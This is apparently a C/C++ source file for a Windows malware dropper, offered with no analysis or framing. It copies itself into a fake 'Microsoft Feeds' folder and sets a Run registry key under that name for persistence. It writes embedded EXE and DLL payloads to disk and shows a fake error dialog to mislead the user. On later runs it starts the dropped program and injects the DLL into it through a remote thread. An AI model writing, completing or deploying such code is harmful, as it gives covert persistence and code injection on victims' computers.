#include <Windows.h>
#include <TlHelp32.h>
#include <shlwapi.h>
#include "resources.h"
#include <stdio.h>

int Inject(const char *procname, char* lpDLLName) {
    PROCESSENTRY32 pe32;
    int pid = 0;
    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    char lpFullDLLPath[260];
    const DWORD dwProcessID = pid;
    GetFullPathNameA(lpDLLName, MAX_PATH, lpFullDLLPath, nullptr);
    const HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
    const LPVOID lpPathAddress = VirtualAllocEx(hTargetProcess, nullptr, lstrlenA(lpFullDLLPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hTargetProcess, lpPathAddress, lpFullDLLPath, lstrlenA(lpFullDLLPath) + 1, nullptr);
    const HMODULE hModule = GetModuleHandleA("kernel32.dll");
    const FARPROC lpFunctionAddress = GetProcAddress(hModule, "LoadLibraryA");
    CreateRemoteThread(hTargetProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpFunctionAddress, lpPathAddress, 0, nullptr);
    return 0;
}

int BLoad(const char *input, const char *output){
    CopyFileA((LPCSTR)input, (LPCSTR)output, 0);
    char autorun[255];
    strcpy(autorun, output);
    HKEY hKeys;
    if(ERROR_SUCCESS==RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)){
        RegSetValueEx(hKeys, "Microsoft Feeds", 0, REG_SZ, reinterpret_cast<const BYTE*>(&autorun), sizeof(autorun));
        RegCloseKey(hKeys);
    }
    return 0;
}

int Temp(){
    char tempPath[275], buf[12] = "temp.exe";
    GetTempPathA(275, tempPath);
    int i1 = 0, i = 0;
    for(i1 = (int) strlen(tempPath); ((int) strlen(tempPath) + (int) strlen(buf)) > i1; i1++){
        tempPath[i1] = buf[i];
        i++;
    } i1 = 0; i = 0;
    HANDLE hFile = CreateFileA(tempPath, FILE_SHARE_WRITE, 1, NULL, 1, FILE_ATTRIBUTE_NORMAL, NULL);
    Resources res;
    unsigned char *exe = res.hexEXE;
    WriteFile(hFile, exe, 8704, NULL, NULL);
    return 0;
}

int dllFeeds(){
    char username[257];
    DWORD username_len1 = 257;
    GetUserName(username, &username_len1);
    char pth[500] = "C:\\Users\\", buf[41] = "\\AppData\\Local\\Microsoft\\Feeds\\Feeds.dll";
    int i1 = 0, i = 0;
    for(i1 = (int) strlen(pth); ((int) strlen(pth) + (int) strlen(username)) > i1; i1++){
        pth[i1] = username[i];
        i++;
    } i1 = 0; i = 0;
    for(i1 = (int) strlen(pth); ((int) strlen(pth) + (int) strlen(buf)) > i1; i1++){
        pth[i1] = buf[i];
        i++;
    } i1 = 0; i = 0;
    HANDLE hFile = CreateFileA(pth, FILE_SHARE_WRITE, 1, NULL, 1, FILE_ATTRIBUTE_NORMAL, NULL);
    Resources res;
    unsigned char *exe = res.hexDLL;
    WriteFile(hFile, exe, 121344, NULL, NULL);
    return 0;
}

bool compare(char* s1, char* s2){
    bool res;
    if(*s1&&(*s1==*s2))
        res=compare(s1+1,s2+1);
    else
        res=(!*s1&&!*s2);
    return res;
 }

int main(int argc, char *argv[]) {
    char username[257];
    DWORD username_len1 = 257;
    GetUserName(username, &username_len1);
    char pth[500] = "C:\\Users\\", buf[41] = "\\AppData\\Local\\Microsoft\\Feeds\\Feeds.exe";
    int i1 = 0, i = 0;
    for(i1 = (int) strlen(pth); ((int) strlen(pth) + (int) strlen(username)) > i1; i1++){
        pth[i1] = username[i];
        i++;
    } i1 = 0; i = 0;
    for(i1 = (int) strlen(pth); ((int) strlen(pth) + (int) strlen(buf)) > i1; i1++){
        pth[i1] = buf[i];
        i++;
    } i1 = 0; i = 0;
    char path[500] = "C:\\Users\\", bufer[41] = "\\AppData\\Local\\Microsoft\\Feeds\\Feeds.exe";
    for(i1 = (int) strlen(path); ((int) strlen(path) + (int) strlen(username)) > i1; i1++){
        path[i1] = username[i];
        i++;
    } i1 = 0; i = 0;
    for(i1 = (int) strlen(path); ((int) strlen(path) + (int) strlen(bufer)) > i1; i1++){
        path[i1] = bufer[i];
        i++;
    } i1 = 0; i = 0;
    if(!compare(path, argv[0])){
        Sleep(0);
        BLoad(argv[0], pth);
        Sleep(0);
        Temp();
        Sleep(0);
        dllFeeds();
        Sleep(0);
        MessageBoxA(0,"Something went wrong", "An error occured",0x10L);
        Sleep(0);
    }else{
        char tempPath[275], buf[12] = "temp.exe";
        GetTempPathA(275, tempPath);
        for(i1 = (int) strlen(tempPath); ((int) strlen(tempPath) + (int) strlen(buf)) > i1; i1++){
            tempPath[i1] = buf[i];
            i++;
        } i1 = 0; i = 0;
        WinExec(tempPath,SW_SHOW);
        char target[] = "temp.exe";
        char pathd[500] = "C:\\Users\\", buferd[41] = "\\AppData\\Local\\Microsoft\\Feeds\\Feeds.dll";
        for(i1 = (int) strlen(pathd); ((int) strlen(pathd) + (int) strlen(username)) > i1; i1++){
            pathd[i1] = username[i];
            i++;
        } i1 = 0; i = 0;
        for(i1 = (int) strlen(pathd); ((int) strlen(pathd) + (int) strlen(buferd)) > i1; i1++){
            pathd[i1] = buferd[i];
            i++;
        } i1 = 0; i = 0;
        Sleep(2500);
        Inject(target, pathd);
        Sleep(0);
    }
    return 0;
}
